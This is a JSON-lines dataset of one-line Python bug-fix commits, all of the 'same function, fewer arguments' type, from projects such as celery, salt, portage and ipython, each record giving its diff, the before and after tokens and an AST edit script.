{"project": "sengfs19-group4", "commit_sha": "38f6d22abbf09dbb7259d67847cdb2e7b67eaeed", "parent_sha": "7fa776230d8d82d45c525bedf02b01f082516b5e", "file_path": "ghdata/server.py", "project_url": "https://github.com/computationalmystic/sengfs19-group4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def read_config(parser, section, name, environment_variable, default):\n \n def run(): \n \n-    app = Flask(__name__, static_url_path=os.path.abspath('static/'))\n+    app = Flask(__name__)\n     CORS(app)\n     # Try to open the config file and parse it\n     parser = configparser.RawConfigParser()\n", "before": "app = Flask ( __name__ , static_url_path = os . path . abspath ( 'static/' ) )", "after": "app = Flask ( __name__ )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Move\", [\"argument_list\", 3, 16, 3, 70], [\"):)\", 3, 68, 3, 69], 2], [\"Delete\", [\",:,\", 3, 25, 3, 26]], [\"Delete\", [\"identifier:static_url_path\", 3, 27, 3, 42]], [\"Delete\", [\"=:=\", 3, 42, 3, 43]], [\"Delete\", [\"identifier:os\", 3, 43, 3, 45]], [\"Delete\", [\".:.\", 3, 45, 3, 46]], [\"Delete\", [\"identifier:path\", 3, 46, 3, 50]], [\"Delete\", [\"attribute\", 3, 43, 3, 50]], [\"Delete\", [\".:.\", 3, 50, 3, 51]], [\"Delete\", [\"identifier:abspath\", 3, 51, 3, 58]], [\"Delete\", [\"attribute\", 3, 43, 3, 58]], [\"Delete\", [\"(:(\", 3, 58, 3, 59]], [\"Delete\", [\"string:'static/'\", 3, 59, 3, 68]], [\"Delete\", [\"argument_list\", 3, 58, 3, 69]], [\"Delete\", [\"call\", 3, 43, 3, 69]], [\"Delete\", [\"keyword_argument\", 3, 27, 3, 69]], [\"Delete\", [\"):)\", 3, 69, 3, 70]]]"}
{"project": "sengfs19-group4", "commit_sha": "ca7a54187ac7056b6e1f0b3d1dd3a7a6b663564d", "parent_sha": "419ca0d8cbfa345fde2b32a2e08ce6137dcede63", "file_path": "ghdata/downloads.py", "project_url": "https://github.com/computationalmystic/sengfs19-group4", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class Downloads(object):\n \n         for file in root_dir:\n             if file.name == \"Gemfile\":\n-                return self.ruby_downloads(repo, contents)\n+                return self.ruby_downloads(repo)\n             if file.name == \"package.json\":\n                 contents = base64.b64decode(file.content)\n                 contents = contents.decode('utf-8')\n", "before": "return self . ruby_downloads ( repo , contents )", "after": "return self . ruby_downloads ( repo )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 48, 3, 49]], [\"Delete\", [\"identifier:contents\", 3, 50, 3, 58]]]"}
{"project": "celery", "commit_sha": "1b30d45b3fb0a4e916911446fa90126c3a479b93", "parent_sha": "ee554ef6641e6e9d16797ffe6ab1a072f84c191d", "file_path": "celery/tests/backends/test_mongodb.py", "project_url": "https://github.com/state-hiu/celery", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -289,7 +289,7 @@ class test_MongoBackend(AppCase):\n         mock_database.__getitem__.assert_called_once_with(\n             MONGODB_COLLECTION)\n         mock_collection.remove.assert_called_once_with(\n-            {'_id': sentinel.task_id}, safe=True)\n+            {'_id': sentinel.task_id})\n \n     @patch('celery.backends.mongodb.MongoBackend._get_database')\n     def test_cleanup(self, mock_get_database):\n", "before": "mock_collection . remove . assert_called_once_with ( { '_id' : sentinel . task_id } , safe = True )", "after": "mock_collection . remove . assert_called_once_with ( { '_id' : sentinel . task_id } )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 38, 3, 39]], [\"Delete\", [\"identifier:safe\", 3, 40, 3, 44]], [\"Delete\", [\"=:=\", 3, 44, 3, 45]], [\"Delete\", [\"true:True\", 3, 45, 3, 49]], [\"Delete\", [\"keyword_argument\", 3, 40, 3, 49]]]"}
{"project": "vumi-go", "commit_sha": "8866a828e029c2db6439c16d49ba636e460fbf49", "parent_sha": "f569c67e7d356ab258298cd644d772fb539af6eb", "file_path": "go/apps/tests/base.py", "project_url": "https://github.com/ChrisNolan1992/vumi-go", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12,7 +12,7 @@ class DjangoGoApplicationTestCase(VumiGoDjangoTestCase, CeleryTestMixIn):\n     def setUp(self):\n         super(DjangoGoApplicationTestCase, self).setUp()\n         self.setup_api()\n-        self.declare_longcode_tags(self.api)\n+        self.declare_longcode_tags()\n         self.setup_celery_for_tests()\n \n     def tearDown(self):\n", "before": "self . declare_longcode_tags ( self . api )", "after": "self . declare_longcode_tags ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 36, 3, 40]], [\"Delete\", [\".:.\", 3, 40, 3, 41]], [\"Delete\", [\"identifier:api\", 3, 41, 3, 44]], [\"Delete\", [\"attribute\", 3, 36, 3, 44]]]"}
{"project": "grab", "commit_sha": "4b3fa77f25e0fe5b2f2593ffe92c7bed46799c6f", "parent_sha": "2fd415bcc9f35f654282bd54a74ce60a69fd9ae7", "file_path": "test/grab_xml_processing.py", "project_url": "https://github.com/sergithon/grab", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -11,7 +11,7 @@ class GrabXMLProcessingTestCase(TestCase):\n \n     def test_xml_with_declaration(self):\n         SERVER.RESPONSE['get'] = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><root><foo>foo</foo></root>'\n-        g = Grab(strip_xml_declaration=True, transport=GRAB_TRANSPORT)\n+        g = Grab(transport=GRAB_TRANSPORT)\n         g.go(SERVER.BASE_URL)\n         self.assertTrue(g.xpath_one('//foo').text == 'foo')\n \n", "before": "g = Grab ( strip_xml_declaration = True , transport = GRAB_TRANSPORT )", "after": "g = Grab ( transport = GRAB_TRANSPORT )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:strip_xml_declaration\", 3, 18, 3, 39]], [\"Delete\", [\"=:=\", 3, 39, 3, 40]], [\"Delete\", [\"true:True\", 3, 40, 3, 44]], [\"Delete\", [\"keyword_argument\", 3, 18, 3, 44]], [\"Delete\", [\",:,\", 3, 44, 3, 45]]]"}
{"project": "salt", "commit_sha": "d25aab03a9e60dd334ec21652eb638afed98e090", "parent_sha": "8c630538bd3085d9f93ba7f9a2a7d4cd93f00a1f", "file_path": "salt/modules/keystone.py", "project_url": "https://github.com/StepOneInc/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,7 +52,7 @@ def auth():\n     auth_url = __salt__['config.option']('keystone.auth_url',\n                                          'http://127.0.0.1:35357/v2.0/')\n     insecure = __salt__['config.option']('keystone.insecure', False)\n-    token = __salt__['config.option']('keystone.token', 'ADMIN')\n+    token = __salt__['config.option']('keystone.token')\n     endpoint = __salt__['config.option']('keystone.endpoint',\n                                          'http://127.0.0.1:35357/v2.0')\n \n", "before": "token = __salt__ [ 'config.option' ] ( 'keystone.token' , 'ADMIN' )", "after": "token = __salt__ [ 'config.option' ] ( 'keystone.token' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 55, 3, 56]], [\"Delete\", [\"string:'ADMIN'\", 3, 57, 3, 64]]]"}
{"project": "celery", "commit_sha": "2845ef67bd54e9108996706be7cbd93e79113d3d", "parent_sha": "ce1d8d5d8c6e2b8d8a296d7bf39dcc672be9d5dc", "file_path": "celery/tests/backends/test_mongodb.py", "project_url": "https://github.com/sisyfuss/celery", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -287,7 +287,7 @@ class test_MongoBackend(AppCase):\n         mock_database.__getitem__.assert_called_once_with(\n             MONGODB_COLLECTION)\n         mock_collection.remove.assert_called_once_with(\n-            {'_id': sentinel.task_id}, safe=True)\n+            {'_id': sentinel.task_id})\n \n     @patch('celery.backends.mongodb.MongoBackend._get_database')\n     def test_cleanup(self, mock_get_database):\n", "before": "mock_collection . remove . assert_called_once_with ( { '_id' : sentinel . task_id } , safe = True )", "after": "mock_collection . remove . assert_called_once_with ( { '_id' : sentinel . task_id } )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 38, 3, 39]], [\"Delete\", [\"identifier:safe\", 3, 40, 3, 44]], [\"Delete\", [\"=:=\", 3, 44, 3, 45]], [\"Delete\", [\"true:True\", 3, 45, 3, 49]], [\"Delete\", [\"keyword_argument\", 3, 40, 3, 49]]]"}
{"project": "chainercv", "commit_sha": "ba43796c67e5708b9b44c3410d71811d3eb35209", "parent_sha": "fb8fe692d20e4ee31c37ca7425697b9a136e640c", "file_path": "tests/utils_tests/testing_tests/test_stub_link.py", "project_url": "https://github.com/yuyu2172/chainercv", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,7 +41,7 @@ class TestStubLinkInvalidArgument(unittest.TestCase):\n \n     def test_no_shapes(self):\n         with self.assertRaises(ValueError):\n-            StubLink(value='uniform')\n+            StubLink()\n \n     def test_invalid_value(self):\n         with self.assertRaises(ValueError):\n", "before": "StubLink ( value = 'uniform' )", "after": "StubLink ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:value\", 3, 22, 3, 27]], [\"Delete\", [\"=:=\", 3, 27, 3, 28]], [\"Delete\", [\"string:'uniform'\", 3, 28, 3, 37]], [\"Delete\", [\"keyword_argument\", 3, 22, 3, 37]]]"}
{"project": "ldap3", "commit_sha": "f450ceaa095d1f83b1e4c7f9cc229d83073b4157", "parent_sha": "b4f4cc80ebc6515fc4cd35b8fdacf7a28906703e", "file_path": "ldap3/core/server.py", "project_url": "https://github.com/aleodoni/ldap3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ class Server(object):\n         if not self._address_info or (datetime.now() - self._address_info_resolved_time).seconds > ADDRESS_INFO_REFRESH_TIME:\n             # converts addresses tuple to list and adds a 6th parameter for availability (None = not checked, True = available, False=not available) and a 7th parameter for the checking time\n             try:\n-                self._address_info = [list(address) + [None, None] for address in socket.getaddrinfo(self.host, self.port, family=socket.AF_UNSPEC, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)]\n+                self._address_info = [list(address) + [None, None] for address in socket.getaddrinfo(self.host, self.port, family=socket.AF_UNSPEC, socktype=socket.SOCK_STREAM)]\n                 self._address_info_resolved_time = datetime.now()\n             except Exception:\n                 self._address_info = []\n", "before": "self . _address_info = [ list ( address ) + [ None , None ] for address in socket . getaddrinfo ( self . host , self . port , family = socket . AF_UNSPEC , socktype = socket . SOCK_STREAM , proto = socket . IPPROTO_TCP ) ]", "after": "self . _address_info = [ list ( address ) + [ None , None ] for address in socket . getaddrinfo ( self . host , self . port , family = socket . AF_UNSPEC , socktype = socket . SOCK_STREAM ) ]", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 176, 3, 177]], [\"Delete\", [\"identifier:proto\", 3, 178, 3, 183]], [\"Delete\", [\"=:=\", 3, 183, 3, 184]], [\"Delete\", [\"identifier:socket\", 3, 184, 3, 190]], [\"Delete\", [\".:.\", 3, 190, 3, 191]], [\"Delete\", [\"identifier:IPPROTO_TCP\", 3, 191, 3, 202]], [\"Delete\", [\"attribute\", 3, 184, 3, 202]], [\"Delete\", [\"keyword_argument\", 3, 178, 3, 202]]]"}
{"project": "Shop_Database_UI", "commit_sha": "21b755864938b3e90098f5fd7fafd085974ceed8", "parent_sha": "631970ea237778d92bcba902e9d6c5d0381342b0", "file_path": "ui/ui.py", "project_url": "https://github.com/konarkcher/Shop_Database_UI", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ class MainWindow(wx.Frame):\n         self.Bind(wx.EVT_MENU, self.on_about, about_item)\n \n     def init_toolbar(self):\n-        toolbar = self.CreateToolBar(style=wx.RIGHT)\n+        toolbar = self.CreateToolBar()\n         set_tool = toolbar.AddTool(wx.ID_ANY, 'Settings', wx.Bitmap('set.png'))\n         toolbar.Realize()\n \n", "before": "toolbar = self . CreateToolBar ( style = wx . RIGHT )", "after": "toolbar = self . CreateToolBar ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:style\", 3, 38, 3, 43]], [\"Delete\", [\"=:=\", 3, 43, 3, 44]], [\"Delete\", [\"identifier:wx\", 3, 44, 3, 46]], [\"Delete\", [\".:.\", 3, 46, 3, 47]], [\"Delete\", [\"identifier:RIGHT\", 3, 47, 3, 52]], [\"Delete\", [\"attribute\", 3, 44, 3, 52]], [\"Delete\", [\"keyword_argument\", 3, 38, 3, 52]]]"}
{"project": "tinydownload", "commit_sha": "3030ee030b9f1138d268459db48509e66c9c8455", "parent_sha": "499d9baa014be8acfe4df9e6bfb29a4ba4cdd066", "file_path": "tudl.py", "project_url": "https://github.com/ritiek/tinydownload", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def parse_args():\n         nargs='*',\n         help='the file_id or the tinyupload link')\n     parser.add_argument(\n-        '-n', '--name', default='.',\n+        '-n', '--name',\n         required=True,\n         help='path and name of the file')\n     return parser\n", "before": "help = 'the file_id or the tinyupload link' ) parser . add_argument ( '-n' , '--name' , default = '.' , required = True , help = 'path and name of the file' )", "after": "help = 'the file_id or the tinyupload link' ) parser . add_argument ( '-n' , '--name' , required = True , help = 'path and name of the file' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:default\", 3, 25, 3, 32]], [\"Delete\", [\"=:=\", 3, 32, 3, 33]], [\"Delete\", [\"string:'.'\", 3, 33, 3, 36]], [\"Delete\", [\"keyword_argument\", 3, 25, 3, 36]], [\"Delete\", [\",:,\", 3, 36, 3, 37]]]"}
{"project": "pycodestyle", "commit_sha": "3bbaa230c4872029999fde25215c6eb6c038f594", "parent_sha": "f25423363eb83ef69fe61cb48829128a0e0aead5", "file_path": "pep8.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/pycodestyle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2098,7 +2098,7 @@ def _main():\n     except AttributeError:\n         pass    # not supported on Windows\n \n-    pep8style = StyleGuide(parse_argv=True, config_file=True)\n+    pep8style = StyleGuide(parse_argv=True)\n     options = pep8style.options\n     if options.doctest or options.testsuite:\n         from testsuite.support import run_tests\n", "before": "pep8style = StyleGuide ( parse_argv = True , config_file = True )", "after": "pep8style = StyleGuide ( parse_argv = True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 43, 3, 44]], [\"Delete\", [\"identifier:config_file\", 3, 45, 3, 56]], [\"Delete\", [\"=:=\", 3, 56, 3, 57]], [\"Delete\", [\"true:True\", 3, 57, 3, 61]], [\"Delete\", [\"keyword_argument\", 3, 45, 3, 61]]]"}
{"project": "ipython", "commit_sha": "ce54e18e5feafffa4307f04c1854a258c3aba7ec", "parent_sha": "eb389453a7cf1b1ade1b1b99c2efd11720eb718d", "file_path": "IPython/utils/text.py", "project_url": "https://github.com/astriker/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ def getdefaultencoding():\n         try:\n             # There are reports of getpreferredencoding raising errors\n             # in some cases, which may well be fixed, but let's be conservative here.\n-            enc = locale.getpreferredencoding(False)\n+            enc = locale.getpreferredencoding()\n         except Exception:\n             pass\n     return enc or sys.getdefaultencoding()\n", "before": "enc = locale . getpreferredencoding ( False )", "after": "enc = locale . getpreferredencoding ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"false:False\", 3, 47, 3, 52]]]"}
{"project": "ipython", "commit_sha": "c8c2d9a02d4e420c6dd43fb0b2a895a01dbd5792", "parent_sha": "e5c63f1ee34bef3586dbbcdcc9d0362b5ad5a994", "file_path": "nbconvert/transformers/csshtmlheader.py", "project_url": "https://github.com/astriker/ipython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -84,7 +84,7 @@ def _regen_header(self):\n         \n         #Construct path to iPy CSS\n         sheet_filename = os.path.join(path.get_ipython_package_dir(), \n-            'html', 'notebook', 'static', 'style', 'style.min.css')\n+            'html', 'static', 'style', 'style.min.css')\n         \n         #Load style CSS file.\n         try:\n", "before": "sheet_filename = os . path . join ( path . get_ipython_package_dir ( ) , 'html' , 'notebook' , 'static' , 'style' , 'style.min.css' )", "after": "sheet_filename = os . path . join ( path . get_ipython_package_dir ( ) , 'html' , 'static' , 'style' , 'style.min.css' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"string:'notebook'\", 3, 21, 3, 31]], [\"Delete\", [\",:,\", 3, 31, 3, 32]]]"}
{"project": "Qcodes", "commit_sha": "848f15033e59d5c708cc0af4ea6a9cbe18c04f1e", "parent_sha": "c23c17fb1634b3d5ca787a39a2391481b582415e", "file_path": "qcodes/tests/dataset/test_subscribing.py", "project_url": "https://github.com/jenshnielsen/Qcodes", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ def test_subscription_from_config(dataset, basic_subscriber):\n             expected_state[x+1] = [(x, y)]\n \n             @retry_until_does_not_throw(\n-                exception_class_to_expect=AssertionError, delay=0, tries=10)\n+                exception_class_to_expect=AssertionError, tries=10)\n             def assert_expected_state():\n                 assert dataset.subscribers[sub_id].state == expected_state\n                 assert dataset.subscribers[sub_id_c].state == expected_state\n", "before": "@ retry_until_does_not_throw ( exception_class_to_expect = AssertionError , delay = 0 , tries = 10 ) def assert_expected_state ( ) : assert dataset . subscribers [ sub_id ] . state == expected_state assert dataset . subscribers [ sub_id_c ] . state == expected_state", "after": "@ retry_until_does_not_throw ( exception_class_to_expect = AssertionError , tries = 10 ) def assert_expected_state ( ) : assert dataset . subscribers [ sub_id ] . state == expected_state assert dataset . subscribers [ sub_id_c ] . state == expected_state", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:delay\", 3, 59, 3, 64]], [\"Delete\", [\"=:=\", 3, 64, 3, 65]], [\"Delete\", [\"integer:0\", 3, 65, 3, 66]], [\"Delete\", [\"keyword_argument\", 3, 59, 3, 66]], [\"Delete\", [\",:,\", 3, 66, 3, 67]]]"}
{"project": "portage", "commit_sha": "5e756821f4ce8a205b52c03c34f5aadfc70154f9", "parent_sha": "fdff94a8c15e6722968bda4a830f7f3303f7bd12", "file_path": "pym/_emerge/actions.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -512,7 +512,7 @@ def action_config(settings, trees, myopts, myfiles):\n \telse:\n \t\tprint(\"Configuring pkg...\")\n \tprint()\n-\tebuildpath = trees[settings[\"ROOT\"]][\"vartree\"].dbapi.findname(pkg, myrepo=pkg.repo)\n+\tebuildpath = trees[settings[\"ROOT\"]][\"vartree\"].dbapi.findname(pkg)\n \tmysettings = portage.config(clone=settings)\n \tvardb = trees[mysettings[\"ROOT\"]][\"vartree\"].dbapi\n \tdebug = mysettings.get(\"PORTAGE_DEBUG\") == \"1\"\n", "before": "ebuildpath = trees [ settings [ \"ROOT\" ] ] [ \"vartree\" ] . dbapi . findname ( pkg , myrepo = pkg . repo )", "after": "ebuildpath = trees [ settings [ \"ROOT\" ] ] [ \"vartree\" ] . dbapi . findname ( pkg )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 68, 3, 69]], [\"Delete\", [\"identifier:myrepo\", 3, 70, 3, 76]], [\"Delete\", [\"=:=\", 3, 76, 3, 77]], [\"Delete\", [\"identifier:pkg\", 3, 77, 3, 80]], [\"Delete\", [\".:.\", 3, 80, 3, 81]], [\"Delete\", [\"identifier:repo\", 3, 81, 3, 85]], [\"Delete\", [\"attribute\", 3, 77, 3, 85]], [\"Delete\", [\"keyword_argument\", 3, 70, 3, 85]]]"}
{"project": "portage", "commit_sha": "def1566b00be9350e945f8162d6be758b15dc4dc", "parent_sha": "b859a2d8beb7c4ad8730c19fca31993f66988d1f", "file_path": "pym/portage/__init__.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -543,7 +543,7 @@ def create_trees(config_root=None, target_root=None, trees=None):\n \n \tfor myroot, mysettings in myroots:\n \t\ttrees[myroot] = portage.util.LazyItemsDict(trees.get(myroot, {}))\n-\t\ttrees[myroot].addLazySingleton(\"virtuals\", mysettings.getvirtuals, myroot)\n+\t\ttrees[myroot].addLazySingleton(\"virtuals\", mysettings.getvirtuals)\n \t\ttrees[myroot].addLazySingleton(\n \t\t\t\"vartree\", vartree, myroot, categories=mysettings.categories,\n \t\t\t\tsettings=mysettings)\n", "before": "trees [ myroot ] . addLazySingleton ( \"virtuals\" , mysettings . getvirtuals , myroot )", "after": "trees [ myroot ] . addLazySingleton ( \"virtuals\" , mysettings . getvirtuals )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 68, 3, 69]], [\"Delete\", [\"identifier:myroot\", 3, 70, 3, 76]]]"}
{"project": "portage", "commit_sha": "e3f0d11c8615010506052793689207b1c3b3bd86", "parent_sha": "ff98e89d26d4e0d4436473d9c9afab8f01c448f5", "file_path": "pym/portage/dbapi/porttree.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -529,7 +529,7 @@ class portdbapi(dbapi):\n \n \t\t\tif eapi is not None and not portage.eapi_is_supported(eapi):\n \t\t\t\tmydata = self._metadata_callback(\n-\t\t\t\t\tmycpv, ebuild_hash, mylocation, {'EAPI':eapi}, emtime)\n+\t\t\t\t\tmycpv, mylocation, {'EAPI':eapi}, ebuild_hash)\n \t\t\telse:\n \t\t\t\tproc = EbuildMetadataPhase(cpv=mycpv,\n \t\t\t\t\tebuild_hash=ebuild_hash,\n", "before": "mydata = self . _metadata_callback ( mycpv , ebuild_hash , mylocation , { 'EAPI' : eapi } , emtime )", "after": "mydata = self . _metadata_callback ( mycpv , mylocation , { 'EAPI' : eapi } , ebuild_hash )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Update\", [\"identifier:emtime\", 3, 53, 3, 59], \"ebuild_hash\"], [\"Delete\", [\"identifier:ebuild_hash\", 3, 13, 3, 24]], [\"Delete\", [\",:,\", 3, 24, 3, 25]]]"}
{"project": "portage-funtoo", "commit_sha": "06ea3c8b3e8f9b6a6abd700000a16608f8a6db4f", "parent_sha": "95d07400e6ef8874f2a30056288b5f1821d89663", "file_path": "pym/portage/output.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -268,7 +268,7 @@ default_xterm_title = None\n def xtermTitleReset():\n \tglobal default_xterm_title\n \tif default_xterm_title is None:\n-\t\tprompt_command = os.environ.get('PROMPT_COMMAND', '')\n+\t\tprompt_command = os.environ.get('PROMPT_COMMAND')\n \t\tif prompt_command == \"\":\n \t\t\tdefault_xterm_title = \"\"\n \t\telif prompt_command is not None:\n", "before": "prompt_command = os . environ . get ( 'PROMPT_COMMAND' , '' )", "after": "prompt_command = os . environ . get ( 'PROMPT_COMMAND' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"string:''\", 3, 53, 3, 55]]]"}
{"project": "portage-funtoo", "commit_sha": "ac6de27c09e48372eb5ddfc804e5d97a70e2dd4f", "parent_sha": "62e88e3e97a3518bf46e78593d631b711e990555", "file_path": "pym/portage/_legacy_globals.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def _get_legacy_global(name):\n \n \tkwargs = {}\n \tfor k, envvar in ((\"config_root\", \"PORTAGE_CONFIGROOT\"), (\"target_root\", \"ROOT\")):\n-\t\tkwargs[k] = os.environ.get(envvar, \"/\")\n+\t\tkwargs[k] = os.environ.get(envvar)\n \n \tportage._initializing_globals = True\n \tportage.db = portage.create_trees(**kwargs)\n", "before": "kwargs [ k ] = os . environ . get ( envvar , \"/\" )", "after": "kwargs [ k ] = os . environ . get ( envvar )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 36, 3, 37]], [\"Delete\", [\"string:\\\"/\\\"\", 3, 38, 3, 41]]]"}
{"project": "flake8", "commit_sha": "7d2b8e6b07ea10157681d8debb6d8a5f3a936bec", "parent_sha": "9e6f5325d6053fd2d3952100944b2a820fda4e7b", "file_path": "flake8/run.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/flake8", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ def _get_files(repo, **kwargs):\n             seen.add(file_)\n             if not file_.endswith('.py'):\n                 continue\n-            if skip_file(file_, pep8style):\n+            if skip_file(file_):\n                 continue\n             yield file_\n \n", "before": "if skip_file ( file_ , pep8style ) : continue", "after": "if skip_file ( file_ ) : continue", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 31, 3, 32]], [\"Delete\", [\"identifier:pep8style\", 3, 33, 3, 42]]]"}
{"project": "mintupdate", "commit_sha": "8fffa4122533250b250e637a0dc79f9d2baff3c9", "parent_sha": "a8f703c385f42b2b6959e7a8b5b062f1902f92f8", "file_path": "usr/lib/linuxmint/mintUpdate/mintUpdate.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/mintupdate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1350,7 +1350,7 @@ class MintUpdate():\n \n             descriptionsMenuItem = Gtk.CheckMenuItem(_(\"Show descriptions\"))\n             descriptionsMenuItem.set_active(self.settings.get_boolean(\"show-descriptions\"))\n-            descriptionsMenuItem.connect(\"toggled\", self.setVisibleDescriptions, self.treeview, self.statusIcon, self.builder)\n+            descriptionsMenuItem.connect(\"toggled\", self.setVisibleDescriptions)\n             viewSubmenu.append(descriptionsMenuItem)\n \n             viewSubmenu.append(historyMenuItem)\n", "before": "descriptionsMenuItem . connect ( \"toggled\" , self . setVisibleDescriptions , self . treeview , self . statusIcon , self . builder )", "after": "descriptionsMenuItem . connect ( \"toggled\" , self . setVisibleDescriptions )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 80, 3, 81]], [\"Delete\", [\"identifier:self\", 3, 82, 3, 86]], [\"Delete\", [\".:.\", 3, 86, 3, 87]], [\"Delete\", [\"identifier:treeview\", 3, 87, 3, 95]], [\"Delete\", [\"attribute\", 3, 82, 3, 95]], [\"Delete\", [\",:,\", 3, 95, 3, 96]], [\"Delete\", [\"identifier:self\", 3, 97, 3, 101]], [\"Delete\", [\".:.\", 3, 101, 3, 102]], [\"Delete\", [\"identifier:statusIcon\", 3, 102, 3, 112]], [\"Delete\", [\"attribute\", 3, 97, 3, 112]], [\"Delete\", [\",:,\", 3, 112, 3, 113]], [\"Delete\", [\"identifier:self\", 3, 114, 3, 118]], [\"Delete\", [\".:.\", 3, 118, 3, 119]], [\"Delete\", [\"identifier:builder\", 3, 119, 3, 126]], [\"Delete\", [\"attribute\", 3, 114, 3, 126]]]"}
{"project": "django-taggit", "commit_sha": "cd9143651c13f4365aa08a2613a173ec6c9ca07e", "parent_sha": "0c7adaee0dd62e0e0a1b00fe4b2684a63c898697", "file_path": "runtests.py", "project_url": "https://github.com/thecut/django-taggit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def runtests(*test_args):\n         test_args = ['tests', 'suggest']\n     parent = dirname(abspath(__file__))\n     sys.path.insert(0, parent)\n-    failures = run_tests(test_args, verbosity=1, interactive=True, failfast=True)\n+    failures = run_tests(test_args, verbosity=1, interactive=True)\n     sys.exit(failures)\n \n \n", "before": "failures = run_tests ( test_args , verbosity = 1 , interactive = True , failfast = True )", "after": "failures = run_tests ( test_args , verbosity = 1 , interactive = True )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 66, 3, 67]], [\"Delete\", [\"identifier:failfast\", 3, 68, 3, 76]], [\"Delete\", [\"=:=\", 3, 76, 3, 77]], [\"Delete\", [\"true:True\", 3, 77, 3, 81]], [\"Delete\", [\"keyword_argument\", 3, 68, 3, 81]]]"}
